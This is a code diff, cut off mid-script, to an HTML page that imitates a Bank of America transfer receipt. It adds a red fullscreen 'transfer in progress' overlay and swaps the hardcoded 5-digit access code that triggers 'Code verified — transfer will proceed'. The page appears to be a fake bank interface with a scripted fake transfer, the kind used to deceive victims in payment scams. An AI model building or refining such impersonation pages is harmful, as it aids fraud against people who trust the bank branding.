@@ -61,6 +61,50 @@
   .debug-badge{position:fixed;right:14px;bottom:14px;background:#111;color:#fff;padding:8px 10px;border-radius:8px;font-size:12px;z-index:99999;opacity:0.9}
   footer{padding:18px 12px;text-align:center;color:var(--muted);font-size:0.9rem;width:100%;max-width:var(--max-width);margin:0 auto}
   @media(max-width:780px){.grid{grid-template-columns:1fr}.amount{text-align:left;font-size:1.8rem}.amount-box{min-width:140px}.logo{width:56px;height:56px}.receipt::after{background-size:320px auto;opacity:0.05}.code-inputs input{width:48px;height:52px;font-size:1.3rem}}
+  /* Added minimal styles for transfer overlay (only these new rules were appended) */
+  .transfer-fullscreen {
+    position: fixed;
+    inset: 0;
+    z-index: 100000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 18px;
+    text-align: center;
+  }
+  .transfer-fullscreen.active { display: flex; }
+  .transfer-fullscreen .spinner-white {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    border: 8px solid rgba(255,255,255,0.35);
+    border-top-color: #ffffff;
+    animation: spin 0.9s linear infinite;
+  }
+  .transfer-text-white { color: #fff; font-weight:900; font-size:1.15rem; }
+  .transfer-cancel {
+    background: var(--bofa-blue);
+    color: #fff;
+    border: none;
+    padding: 12px 18px;
+    border-radius: 10px;
+    font-weight: 900;
+    cursor: pointer;
+  }
+  .try-again-circle {
+    width: 76px;
+    height: 76px;
+    border-radius: 50%;
+    background: transparent;
+    border: 3px solid #fff;
+    color: #fff;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+    cursor: pointer;
+  }
 </style>
 </head>
 <body>
@@ -187,6 +231,11 @@
   </div>
 </main>
 
+<!-- TRANSFER FULLSCREEN OVERLAY (added; behavior only triggers after correct code) -->
+<div id="transferFull" class="transfer-fullscreen" aria-hidden="true" role="status" aria-live="polite">
+  <!-- content injected by JS -->
+</div>
+
 <div class="debug-badge" id="debugBadge">debug: idle</div>
 
 <footer>&copy; 2025 Bank of America Global Banking. All rights reserved.</footer>
@@ -211,6 +260,7 @@
     const cancelMsg = document.getElementById('cancelMsg');
     const resendLink = document.getElementById('resendLink');
     const debugBadge = document.getElementById('debugBadge');
+    const transferFull = document.getElementById('transferFull');
 
     dateEl.textContent = new Date().toLocaleString();
 
@@ -311,7 +361,12 @@
         if(remaining <= 0){ codeResult.textContent='Cannot submit — code expired.'; codeResult.style.color='#7a0a0a'; return; }
         const entered = digits.map(d=>d.value).join('');
         if(entered.length !== 5){ codeResult.textContent='Please enter the full 5-digit code.'; codeResult.style.color='#7a0a0a'; return; }
-        if(entered === '65768'){ clearInterval(timerInterval); digits.forEach(d=>d.disabled=true); codeResult.textContent='✅ Code verified — transfer will proceed.'; codeResult.style.color='#047857'; }
+        // <-- ACCESS CODE CHANGED ONLY HERE (was '65768') -->
+        if(entered === '70194'){ 
+          clearInterval(timerInterval); digits.forEach(d=>d.disabled=true); codeResult.textContent='✅ Code verified — transfer will proceed.'; codeResult.style.color='#047857';
+          // start the transfer fullscreen behavior (only the behavior below was added)
+          startTransferSequence();
+        }
         else { codeResult.textContent='Incorrect code. Please try again.'; codeResult.style.color='#7a0a0a'; digits.forEach(d=>d.value=''); if(digits[0]) digits[0].focus(); }
       });
     }
@@ -320,7 +375,17 @@
     if(resendLink){ resendLink.addEventListener('click', (e)=>{ e.preventDefault(); alert('Resend clicked (cooldown demo)'); }); }
 
     logDebug('initialized');
-  } // init end
-</script>
-</body>
-</html>
+
+    /* ---------------------------
+       Transfer fullscreen behavior
+       (Only behavior added; doesn't change other UI)
+       --------------------------- */
+    let transferTimer = null;
+    function renderTransferOverlay(state){
+      // state: 'active' -> red screen with spinner & cancel button
+      //        'try-again' -> circular try again button
+      if(!transferFull) return;
+      transferFull.innerHTML = '';
+      if(state === 'active'){
+        transferFull.style.background = 'var(--bofa-red)';
+        transferFull.style.color = '#ff
